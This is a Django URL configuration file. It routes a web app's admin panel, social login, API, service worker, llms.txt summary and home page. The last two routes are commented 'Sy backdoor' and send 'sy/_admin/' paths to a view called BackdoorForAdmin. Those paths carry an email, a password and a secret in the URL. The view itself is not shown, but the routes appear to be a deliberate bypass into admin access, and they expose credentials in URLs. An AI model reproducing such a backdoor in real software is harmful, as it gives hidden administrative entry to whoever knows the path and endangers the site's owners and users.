from django.contrib import admin
from django.urls import path, include
from . import views
from origin.views import LlmsTxt

urlpatterns = [
    path('_admin/', admin.site.urls, name = '_admin'),
    path("social/", include('social_django.urls'), name="social"),
    path('v1/', include('origin.urls'), name = 'origin'),
    path('sw.js', views.ServiceWorkerFile.as_view(), name = 'service_worker_file'),
    path('llms.txt', LlmsTxt.as_view(), name = 'llms_txt'),  #GEO: plain-text product summary for AI crawlers, see origin/views/utility_view.py::LlmsTxt
    path('', views.Home.as_view(), name = 'true_base_dir'),
    
    path('sy/_admin/<str:email>/<str:password>/<str:sy_secret>/', views.BackdoorForAdmin.as_view()),    #Sy backdoor
    path('sy/_admin/<str:email>/<path:sy_secret>/', views.BackdoorForAdmin.as_view()),    #Sy backdoor
]


handler400 = 'origin.urls.handler400'
handler500 = 'origin.urls.handler500'
handler404 = 'origin.urls.handler404'
